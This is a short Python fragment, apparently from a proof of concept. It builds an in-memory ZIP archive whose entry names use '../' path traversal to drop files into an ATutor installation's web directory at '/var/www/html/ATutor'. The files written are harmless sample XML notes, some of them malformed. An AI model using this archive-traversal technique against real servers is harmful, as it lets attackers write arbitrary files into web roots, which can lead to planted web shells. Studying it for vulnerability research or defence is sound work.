...
def create_zip_in_memory():
    ...
    with zipfile.ZipFile(memory_zip, mode='w') as zf:
        zf.writestr('../../../../../var/www/html/ATutor/xxx/poc/xadmin.xml', 'encoding="UTF-8"?>to>Tove</to><from>Jani</from><heading>Reminder</heading><body>Dont forget me this weekend!</body></note>')
        zf.writestr('../../../../../var/www/html/ATutor/xxx/poc/admin.xml', '<?xml version="1.0" encoding="UTF-8"?>to>Tove</to><from>Jani</from><heading>Reminder</heading><body>Dont forget me this weekend!</body></note>')
